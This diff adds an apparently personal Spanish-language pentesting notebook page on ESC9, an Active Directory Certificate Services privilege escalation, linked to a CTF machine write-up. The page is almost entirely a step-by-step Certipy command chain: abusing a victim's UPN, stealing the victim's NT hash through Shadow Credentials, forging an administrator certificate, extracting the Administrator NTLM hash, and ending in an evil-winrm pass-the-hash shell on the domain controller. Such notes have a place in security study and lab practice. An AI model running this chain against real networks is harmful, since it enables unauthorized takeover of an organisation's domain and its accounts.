@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>ESC9 | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="esc9">
+          <div class="note-tabbar">
+            <span>ESC9</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ADCS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / adcs</p>
+            <h2>ESC9</h2>
+
+            <p>ESC9 está relacionado con plantillas sin security extension y escenarios donde se puede mapear el certificado hacia otra identidad.</p>
+
+            <h2>No Security Extension on Certificate Template</h2>
+            <p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template">ESC9 PoC</a></p>
+            <section class="code-card">
+              <h3>Opcional: Leer UPN de la víctima</h3>
+              <pre><code>certipy-ad account -u &#x27;&lt;attacker&gt;@&lt;domain&gt;&#x27; -p &#x27;&lt;pass&gt;&#x27; -dc-ip &#x27;&lt;dc_ip&gt;&#x27; -user &#x27;&lt;victim&gt;&#x27;  read
+# [*] Reading attributes for &#x27;victim&#x27;:
+# cn                 : Victim
+# userPrincipalName  : victim@CORP.LOCAL</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>1. Agregar a la víctima al UPN del Administrador</h3>
+              <pre><code>certipy-ad account -u &#x27;&lt;attacker&gt;@&lt;domain&gt;&#x27; -p &#x27;&lt;pass&gt;&#x27; -dc-ip &#x27;&lt;dc_ip&gt;&#x27; -upn &#x27;administrator&#x27; -user &#x27;&lt;victim&gt;&#x27; update</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>(En caso de NO tener credenciales de la víctima) Obtener credenciales via Shadow Credentials</h3>
+              <pre><code>certipy-ad shadow -u &#x27;&lt;attacker&gt;@&lt;domain&gt;&#x27; -p &#x27;&lt;pass&gt;&#x27; -dc-ip &#x27;&lt;dc_ip&gt;&#x27; -account &#x27;&lt;victim&gt;&#x27; auto
+# Obtenemos hash_NT de la víctima
+# Obtenemos victim.ccache
+export KRB5CCNAME=victim.ccache</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>2. Solicitar certificado .pfx para la víctima con la plantilla vulnerable</h3>
+              <pre><code># Solicitar con credenciales de victim
+certipy-ad req -u &#x27;&lt;victim&gt;&#x27; -hashes &#x27;&lt;hash_NT_victim&gt;&#x27; -dc-ip &#x27;&lt;dc_ip&gt;&#x27; -target &#x27;&lt;hostname&gt;.&lt;domain&gt;&#x27; -ca &#x27;&lt;ca_name&gt;&#x27; -template &lt;&#x27;template_name&#x27;&gt;
+# Solicitar con kerberos KRB5CCNAME y la flag -k 
+certipy-ad req -k -dc-ip &#x27;&lt;dc_ip&gt;&#x27; -target &#x27;&lt;hostname&gt;.&lt;domain&gt;&#x27; -ca &#x27;&lt;ca_name&gt;&#x27; -template &#x27;&lt;template_name&gt;&#x27;
+# Obtenemos administrator.pfx</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>3. Revertir el UPN de la víctima</h3>
+              <pre><code>certipy-ad account  -u &quot;&lt;attacker&gt;@&lt;domain&gt;&quot; -p &quot;&lt;pass&gt;&quot; -user &#x27;&lt;victim&gt;&#x27; -upn &#x27;&lt;victim&gt;@&lt;domain&gt;&#x27; update</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>4. Autenticarnos como administrator para conseguir su hash NTLM</h3>
+              <pre><code>certipy-ad auth -pfx administrator.pfx -domain &#x27;&lt;domain&gt;&#x27; -dc-ip &#x27;&lt;dc_ip&gt;&#x27;
+# Obtenemos hash_NTLM de Administrator</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Acceso WINRM</h3>
+              <pre><code>evil-winrm -u &#x27;Administrator&#x27; -H &#x27;&lt;hash_NT&gt;&#x27; -i &#x27;&lt;ip_dc&gt;&#x27;</code></pre>
+            </section>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=certified">Certified</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>adcs</span>
+              <span>esc9</span>
+              <span>certipy</span>
+              <span>upn</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
